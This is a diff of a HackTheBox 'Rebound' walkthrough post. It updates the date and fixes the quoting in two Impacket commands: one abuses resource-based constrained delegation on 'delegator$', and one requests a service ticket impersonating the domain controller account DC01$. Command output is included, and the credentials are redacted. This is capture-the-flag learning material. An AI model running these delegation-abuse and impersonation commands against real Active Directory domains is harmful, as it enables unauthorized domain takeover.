@@ -1,6 +1,6 @@
 ---
 title: "Rebound - HackTheBox"
-date: 2025-10-24 00:10:00 +0800
+date: 2025-10-25 00:11:00 +0800
 categories: [Walkthroughs]
 description: "Non Seasonal Machine — Windows [Insane]"
 tags: [HTB, Cross-Session NTLM Relay, RBCD]
@@ -378,10 +378,9 @@ Then chain:
 
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Rebound]
-└─$ impacket-rbcd 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -k -delegate-from `ldap_monitor` -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
+└─$ impacket-rbcd 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -delegate-from 'ldap_monitor' -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[-] CCache file is not found. Skipping...
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 [*] Delegation rights modified successfully!
 [*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
@@ -406,7 +405,7 @@ Let's get a **TGS** as `DC01$` on `delegator$`:
 
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Rebound]
-└─$ impacket-getST 'rebound.htb/ldap_monitor:[REDACTED]' -spn `browser/dc01.rebound.htb` -impersonate `DC01$`
+└─$ impacket-getST 'rebound.htb/ldap_monitor:[REDACTED]' -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for user
